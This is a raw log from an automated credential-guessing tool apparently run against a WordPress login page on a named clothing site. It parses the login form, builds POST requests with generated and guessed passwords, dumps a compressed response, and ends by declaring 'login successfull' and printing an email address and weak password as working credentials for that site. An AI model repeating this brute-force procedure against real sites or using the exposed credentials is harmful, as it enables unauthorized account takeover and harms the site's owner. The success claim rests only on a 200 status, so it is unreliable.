INFO:root:random password generated: Vt-p?h+SoN
INFO:root:username_element: log
INFO:root:password_element: pwd
INFO:root:random password generated: %~S?Ak|\u(
INFO:root:username_element: log
INFO:root:password_element: pwd
INFO:root:{
  "url": "https://alqlambara.com/clothes/wp-login.php",
  "pass_user": "pass_user.csv",
  "params_list": {
    "password_param": [
      "password"
    ],
    "user_param": [
      "username",
      "email",
      "log",
      "id"
    ],
    "ButtonList": [
      "login",
      "sign in"
    ]
  }
}
INFO:root:{
  "button_attr": "input[type=submit][name=wp-submit][id=wp-submit][class=button\\ button-primary\\ button-large][value=Log\\ In]",
  "form": "<form action=\"https://alqlambara.com/clothes/wp-login.php\" id=\"loginform\" method=\"post\" name=\"loginform\">\n<p>\n<label for=\"user_login\">Username or Email Address</label>\n<input autocapitalize=\"off\" autocomplete=\"username\" class=\"input\" id=\"user_login\" name=\"log\" size=\"20\" type=\"text\" value=\"\"/>\n</p>\n<div class=\"user-pass-wrap\">\n<label for=\"user_pass\">Password</label>\n<div class=\"wp-pwd\">\n<input autocomplete=\"current-password\" class=\"input password-input\" id=\"user_pass\" name=\"pwd\" size=\"20\" type=\"password\" value=\"\"/>\n<button aria-label=\"Show password\" class=\"button button-secondary wp-hide-pw hide-if-no-js\" data-toggle=\"0\" type=\"button\">\n<span aria-hidden=\"true\" class=\"dashicons dashicons-visibility\"></span>\n</button>\n</div>\n</div>\n<p class=\"forgetmenot\"><input id=\"rememberme\" name=\"rememberme\" type=\"checkbox\" value=\"forever\"/> <label for=\"rememberme\">Remember Me</label></p>\n<p class=\"submit\">\n<input class=\"button button-primary button-large\" id=\"wp-submit\" name=\"wp-submit\" type=\"submit\" value=\"Log In\"/>\n<input name=\"redirect_to\" type=\"hidden\" value=\"https://alqlambara.com/clothes/wp-admin/\"/>\n<input name=\"testcookie\" type=\"hidden\" value=\"1\"/>\n</p>\n</form>",
  "user_param": "log",
  "password_param": "pwd",
  "contentLen": 3658.0,
  "post_data": {
    "log": "m7mdassi",
    "pwd": "%~S?Ak|\\u(",
    "wp-submit": "Log In",
    "redirect_to": "https://alqlambara.com/clothes/wp-admin/",
    "testcookie": "1"
  },
  "method": "POST",
  "action": "https://alqlambara.com/clothes/wp-login.php",
  "headers": {
    "host": "alqlambara.com",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0",
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "accept-language": "en-US,en;q=0.5",
    "accept-encoding": "gzip, deflate, br",
    "referer": "https://alqlambara.com/clothes/wp-login.php",
    "content-type": "application/x-www-form-urlencoded",
    "origin": "https://alqlambara.com",
    "alt-used": "alqlambara.com",
    "connection": "keep-alive",
    "upgrade-insecure-requests": "1",
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "same-origin",
    "sec-fetch-user": "?1"
  },
  "status_code": 200,
  "req_body_type": "URL_ENCODED"
}
INFO:root:[+ payload]: {'log': 'alqlambara@gmail.com', 'pwd': 'asdasd', 'wp-submit': 'Log In', 'redirect_to': 'https://alqlambara.com/clothes/wp-admin/', 'testcookie': '1'}
INFO:root:current status code: 200
INFO:root:current content: b'\x03R\x0b\x00\x80\xaa\xaa\xaa\xea\xff\xec~9Ik\x01\xa4\xb9\x03\x84\x9a\xba\xc7\xea\xe1nf\xd5\xddU\xd9\r\x05\x10\xd9\x15\xd0\x11\xd9\x05\r\x1d\r\x01j\xaabf\xea\xa1\xa6\xaa)*\xe6\x16^\x01\xe1\x97\x1b\xf6o\x93\xd0\xb3\x96\xf6\xe6_\xad\xdfl`edd$r%\x12h\xaf\xb56\x12\x89D\x9e\xfc\xc2\xc8\xeaZb\x1f\xcf]\x8b\x88!\x00\xea\x0eT\x7f\xf9\xf5\xf7_\x9e\xff\xfb\xf8\x15\x06\x1e}\xb3\\T\xef\xf8\x7f`\x1d\xd5\xc23\t\xf0:\xf4\xb5\xc0 \xbf?\x89\xe5"\x11v\xee\xbd\x16\xb1\xdf\xc3\xc0\x9c\xf2^\xa9\xd8\xa7rD\x15\xf2O\x02\x8cPAm\xdf1\x8d\xc8\x1a\x14qT\xe2\x8f\xc9\x9dj\xf1K\x0c\x8c\x81\xe5\xf39\xa1\x00#q\xb6\x16\x8c\xef\xacV\xc6\x81\x03\x98ASF\xae\xbf?\xffC\xee\x04(S\xf8{v\xec\xb1y\x88=\xfc\x16\xe0\x8b\xcf\xfa\xc7\x14\x0f\xd0\xe9<\xb8\x18\xe0\xcbO\xbb\xcb\xed\xe5\x01\xfe\x88d\x1f\ts\xae\xd4$\xa7K\x10\xbe\x1d\xf4\x88uA\xb1\x8d\x9c\x8b\x85\xbb\xf3\xc5\xa8\xdf\xa5\x1bu\x8f2\x11\x9e\x1c\xce{\xaf\xa9\xc7\x0b\x08\xd1\x05\x8b\xef\x1f\x98i2\x83;a\x81\x05;\x95w\xe1\r\x08}]\xd8\x90\'\xe2`\x87l\x86\x02\x06\xc2\xae.\x94\xca\xe5\\F\xea\'\xdc\xd8\xcf|\xf6\x98\x07D.\xc0\xd9\xba\xb0\xd8\xd101dir.\xc0\x84g\xa6\x98\xce\xbf\xd2\xfe\x87\xd7c\xabI\x97&\x8e\xca\xf8\xc8\x03f5\'\xe9\x82\xf1\x93\xc5\xacL\xce\xcaPw\xaa\x1c](M\xce?\x9f\x90\xea\xdbrS\xc0\x88\xd6\xe9\xba\xd0\xde\xa3\xf9\x87\xdaN\xccX\xee\x97\xcc\xbc\rI\xed"\x8d|\xfc\xa0\xd1vtA\x91\x81h\xe1m\x10\xaa\xdfnB4~n\x81\x80\r\xbc\x0f@\x89\xbdCp\x1f\xb6\xf0;\x08\x1b\x95`\xb1C"\xa4Z\xf8jd&gXFrx\xd0\x98\x07\x0c\xd2P\xccY\xeac"\xe9\xc2POE\xc1\xa0\xa6H\\\xc5_\xed\xd9Y\x1ej\x8b\'gP\nH\xea\xb7.*54\x04\xdfl\xa3=\x83\xf1:\xe7Z\xf8N\x16B\x94\xc7\x0c\xdf4\x93\xda\xb0\x8bA\n\xe8\x04\xccI\x9aH(\'\x07\xe0\xa3\xd1\x1e%\x069e\xe1\x11Z\xd9\x90K\x0c|N\xd8=|=\xea\x93\x1eq\xac\xd4X\xd8h\xa6\x11\x03\x97\xabB\xcb\x87\xec\xbf\xf4\x88P\xc3\xe8\xf7\x8d\x920ympU\xa0\xa2fqQ\x1cs\xb1>,\x17\x952\xed\xd8r\xad\xac;\xd50\x04\x7f\\\xccV\xc3\xb6\xa94\xf4\x00RQ\xc4a\x9a#\xd9\xd4\x8a\xc0\xfd\xa0\xadD\xf3\x18g$\xb4\xd0\x9e\xbbT\xcf\xe8\xa6R\xc3\xd6%\xacM\x1fxE\xa2H\xa2YT\x99)\x86\xbe\xf9*C\xae\x94\xc47\xf6\xf0< $\x9d\xf3J\x98\xc19N\x80\x81\x97\xa0\xfd.\x12\xf0\x80\x80\xa3v\x1e\xb4\xb50\xa0`*,:K\xfek\xaf\x04\xee/\xa3\xe5=p\x19\\0\x91\x08\r\x97\xe0\xd5\xad\x85\x01\x9e:\xb6\xa5\xd8(\x8f\x95iHj<KmL\x9c\x02+\x1f3K\x90\xc1*\xd1<\xc4\xccX\xa1\x84\xbc\xd3\x9f\t\xa0\xdcR[%\xa3\xac;5K:\xc1\xb5\xac\xd0\xadIHf\x99\n\xce/"\x92D\xd1\x9a\xef\xee\x19tyN\xb9\xe4\x18\xe0\x8e\x80\x11y\x88\xb6\x16)f\x0e\x1d\x95E\x95\x82\x8a#\x8bE\xe5u\x8b\x1e\xbaH\xb5\x982\xd2k\x06\x92\x11\xcd\xf7\x8c\x04\x07\x13D\x82\xaf\x94!\xc3\xdf8u\xb9R\xb3(Y\xa8.\xa4)\x17{*|\xb8\x08\xfa\xa5\xdd\x19hrZZ\xcc)L-\xda\xf6\\\x07>\x05}\xa8\x8dhv.\xe0\xa4\xfd\x84\xb5p\xf1\xb2\x88\xdcQ\x01\xd9\xfd\x89\xb5\xb8\xdc\x08\xd0\x13G\xa3\x93c\xed\xe5Tb\xd7\rx\x1b\xc7\xe4\x91\x11\x86cwRE\xd6E\xa5\x12\xe7$\xb9\x17\xebC\x14c\xe0&9\x93N<\xb9\x07\x04qd\x8bh\x1e\x13\xd0o\xd0\xc1\x89\x9c\x0c\x9a9\xc94[C~\x83(\xb6\xc2\xc9;\x90\xc5\xba1\xcc\x91,\xd6x\x1dWcZ\xa9\xa4\xeej\x9b\xa6\x91\x91j&\xa2#\x08x9\x01\x13\xfb\x1bc\x95\xcd,u\x16\x11\x8c\x91\x11\x91\xc2\xabk\xc8\x8c&\x06\xab\xe9\xdc\xaa0\x1b\x9cE\x99fx\xa7\xe2:\xd9DhO\x80\xd5\xac%\xc7\xbe\xf7X\x8bh\x813 \xe6\x8f\xa9\xc5\xd3\x10g\xf8\xdd\xc0\x95YT9\xe9\xc0c\x18wx\x85\xaf\xae)O.\xbb\xd6y\xc7ga\xd2\xed\x0e\xceZ\x0c\xb5`\x9aP4\x952\x02\xc9\xce\xb2\xa8\x14^\'"\xad*\xcd\xad\xbfX\xa0i\xc9\xd0\xee"\xf5\xc8#\x86\xc8\xa2Im\xcf\x89\xd3\xa8\x05\xe1\x88c\x8b\x94D\x90\xa6;3\x03\x9a\xb76\xbe\x07\xcf\xadtR\xe2\xeet\x91\xf0\x84$\x00T\x03\x95\xdf$U\xb6\xd4\xcf\xcd\xbfm\xfb\x02\xdf0\x99B\xcc\xce5\xb4)O\xed\xe8\xca\xd6o$S\x1aM5W\xe6$\x85!;+\xea\xa7\xb4\x14B\x86\x18\xd6Dn\x8c dD\xe5\xc1\x8fF\x0f\xe4\xa0\xb9\xc8\r\xfeI\xac\x08\x07\xc2\xfc\xb0|%\xb4\xaes\xa2\xbcr4\xd3\r\x9b\xc1\xa2\x82\xd7\xadS\xe73Dx\xcdBs\xc6\xcc&\xc67G\xf4E\xb7\x06Bb.W\xaaIB\xaa;F\x97\xc9(A\x9fR\xac\xcb\x8bEk\xff\xf0\'\xc6PU,\x1d\xa7\xf5\xafv\xebi\xd1M\xc1\xec\xfd8\x0fsz\xd5\xcc8&~\xed\xa2\x99\xf2j\r\x1f\x19\xf9\xd9\x8d\x18\'^\x81r\xe01\xc3t\x86\x0f\xbb\xa5\xf7L\x8f\xfc\xd5\xe3\xbe\x0f\xf3\xf7\xf3ov\x05M\xa57\xad\x0f`\xcb\xfc\xa4\x19\xd4 \xc4\xc1\x96\x8bx\x1e\xfb\x8b\x8c\x1e\r\xaf\xd6\x87O0\x9a\xcd\xb0\x02$X\xc3\xc7\xe7\xe7\x05\\n6\xeb\xc3\xe7\x12\xddMsX\xba\x0eV9A\xfb\xb1\x839\xfd\x1e|\xd4\x16\xea\xba\x86\x02k\xd0\xc2\x12\xc6\xf1\xbaZ\xc3\';\x10Rb\xaas\tr\xa0\x1a\xad6o\x1c[\x1f\xfbx\xb9\x97\x84jO4_\xbc&:\xc0?#p\x84\x0b\x91\xe7\xfd\x95\x17\xd3\xb4\x0e-\x8a\xff\x97\xf1\x18\x8fG\xe6\xc7\x84t~\xe2\x86J\xa4\xd5\t\x9dr\xb1>I\xb9\xbd\x07\x97\xb9\xd4\xd6\xae\x8a<\xe87<&\xdd\xd0\xcaEW!\x93\xb9\xd3\xfcT=fu\\\x99\xd2k<\xd5\xea\xf1V\xe3\xf2Uy\xaf!\xbe;\x89\x9e\x1c\x0e\xcb1\x17]\x0f1\xc7r\xb3\\\xfc\x03\x9e\x99\x1c]O\x9a\x11\xc4U\xb9*/\x9f~R|\x06\x07\xa3=\xf7\xe7\xbb9\xb5A\xea|\x0eF\x1e\xb3\xc4w&]4\xcb\x93&xUp\x07\x9e\x90\xd9\x85>C\r\x1f"\x93\x11\xfb\x83\x8d//\xea\xa5{\\\xeb\xcb\xa9+\xe8K\xff\xc0p\x134/\xea\x98_\x94A\x970O\xe2\xf3\xb0\xac\x88\xb9\xb3X\x16\x1f\x92\xfdx\xc5\xd4\xed\x83GN~B<NZ\x97Y\x9d0\xd8H\x8a\xb0\xc7\x80\xa49\x92\xa4)\xb0\x1b#\xd37\x9br{U\xde\x03r\x8f\xd4?\x10\x17\x9fnl\xf4\xe7\xcey\xcfL\xaf^\x95\xdb\x1br\xc2R\xed\x93p\xd4!\xc6\xb7\xbb\xaeK\x019mn\xed\xeduwi\xda]wcn\xdb\xf6\xfa\xdeh\xa3\xaf\xee\xba\xdd\xeerg\xf0\x8a W\xe6$g\xd3\'!\xaan\xbb\x0b<\xf4Nc\x8bx}{wsgn\xf5\xf5v\x8bW\xbb\xcen\xee\xee\xf5\x9d6w[{\x7f\r\xa8\xe3\xc9\xcf\xe0\xe1\xe4\xd2Y\xabkJ\xdd1R\xd1,\xe7TN\xc4Tf\xe4\x87\xeb \xcd\x7f\xd5\xacW\xf0\x01\xc5?G\xe0\xbf\xaa\x14\xb7\x11\xda{\x996\x9b\xcd\xb5g*\xf6\xf0?(>`\xe0\xff\xf0\t\xeb\xc2\xf8\x86\xd7\xd3t\x10\xf4\xbb23a\xe8y\x90#2\x92,\xdak\x9b\xe6\xfc\xb0\xdd\x84b\xa5\xc6\x14\xdeB\x9c\x83\xd8\x8b\xa3pP0\x10\x14\xc6C\xbd\x10y\xb8\x1f\xa3\xee\xc5\x7f\xf0\x9c\x886\xea7q!Zm\xc5^\xfc!p\xa5\x8fQ\x82\xf97\xb4n\x1a\xc5\x85\xb8\xe1\xb9I\xec\xc5\x13_\xfc`\xc5\x85\x18]\x1e\xf7$T\xb1\x17\xdf>\xc3\xdb*\\\xfe\xb5(\xc7\xac\x1c\xff~\x15\xcf\xb1\xe9>\xa3\xffL\x08_\xdd\xf9\xcd\x14,R\xbe\xedc\x85A\xb7\xf5\x8d\x94\xc2\x0b\xadgV\xe6`\x9a9\xc9\x89]\xd1a\xa3\xdb\x9a9}g\xe7\x9f\xfe\x8e>\xeaw\xb1\xff\x10\x13y\xb1\x17\xdd\xf5*\xf2\x94_\xd4+\xa9TF\xbcB\xea\'\xf5w\x1a\x1a6\xb3\x9f\x90\xae\xbc\x1d\xd9N\xe3\xcf\xfa\xc9\xb7$+\x13\xc5\xcey:\xb0v\x96\xc7\xf5q\xd8-\xb2\x95\xaf\xb4\xea2\r\x077\xe2B\x84\x18\x0c\x8a\xbd\xd0]\xd7\xdd\xd8\xdd\xcd\xfd\xe5~q\xafH\x13\xfb\xc5+\r\xc8\x1e;\xb7R\xda\xf2p}q\xb4\xc6\xa3&\xd1\x1cZ\xc2\x81J\xb5\xd1\x9e\x9b\xe5\xa2R\x03\x8f\xbeY.\x06'
INFO:root:login successfull

username: alqlambara@gmail.com
password: asdasd
